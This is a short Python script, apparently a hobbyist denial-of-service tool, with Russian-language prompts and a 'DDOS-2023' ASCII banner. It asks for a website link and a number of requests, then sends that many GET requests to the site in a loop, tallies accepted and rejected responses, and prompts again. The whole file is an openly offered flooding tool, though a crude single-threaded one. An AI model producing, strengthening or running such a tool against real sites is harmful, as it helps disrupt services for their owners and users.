print('Louding...\n')
try:
    import time
    time.sleep(0.2)
    print(f'time_version==True')
    time.sleep(0.2)
except:
    print('module ERROR')
    exit()
try:
    import requests
    print(f'request_version=={requests.__version__}')
    time.sleep(0.2)
except:
    print('module ERROR')
    exit()
try:
    from colorama import init, Fore
    from colorama import Back
    print(f'colorama_version==True')
    time.sleep(1)
except:
    print('module ERROR')
    exit()

def main():
    link = input(Fore.RED + 'ссылка на сайт :')
    num = int(input(Fore.RED + 'число запросов :'))
    requests_setings(url=link,num_requests=num)

def TrueSendGetRequests(url,num_requests):
    init(autoreset=True)
    true = 0
    false = 0
    for num_requests in range(num_requests):
        response = requests.get(url)
        to = response.status_code
        if to == 200:
            true += 1
            print(Fore.BLUE + 'запрос принят')
        else:
            false += 1
            print(Fore.RED + 'запрос откланён')
    print('\n\n')
    print(f"\nуспешных запросов - {true}\nошибочных запросов - {false} \n")

    main()

def FalseSendGetRequests():
    main()

def requests_setings(url, num_requests):
    try:
        TrueSendGetRequests(url,num_requests)
    except Exception as err:
        init(autoreset=True)
        print(Fore.RED + f'ERROR link settings,more :\n{err}')
        FalseSendGetRequests()

if __name__ == '__main__' :
    init(autoreset=True)
    print('run\n\n')
    time.sleep(2)
    print(Fore.GREEN + '██████╗░██████╗░░█████╗░░██████╗░░░░░░██████╗░░█████╗░██████╗░██████╗░')
    time.sleep(0.3)
    print(Fore.GREEN + '██╔══██╗██╔══██╗██╔══██╗██╔════╝░░░░░░╚════██╗██╔══██╗╚════██╗╚════██╗')
    time.sleep(0.3)
    print(Fore.GREEN + '██║░░██║██║░░██║██║░░██║╚█████╗░█████╗░░███╔═╝██║░░██║░░███╔═╝░█████╔╝')
    time.sleep(0.3)
    print(Fore.GREEN + '██║░░██║██║░░██║██║░░██║░╚═══██╗╚════╝██╔══╝░░██║░░██║██╔══╝░░░╚═══██╗')
    time.sleep(0.3)
    print(Fore.GREEN + '██████╔╝██████╔╝╚█████╔╝██████╔╝░░░░░░███████╗╚█████╔╝███████╗██████╔╝')
    time.sleep(0.3)
    print(Fore.GREEN + '╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░░░░╚══════╝░╚════╝░╚══════╝╚═════╝░')
    time.sleep(0.3)
    print(Fore.GREEN + '══════════════════════════════════════════════════════════════════════')
    time.sleep(1.2)

    main()
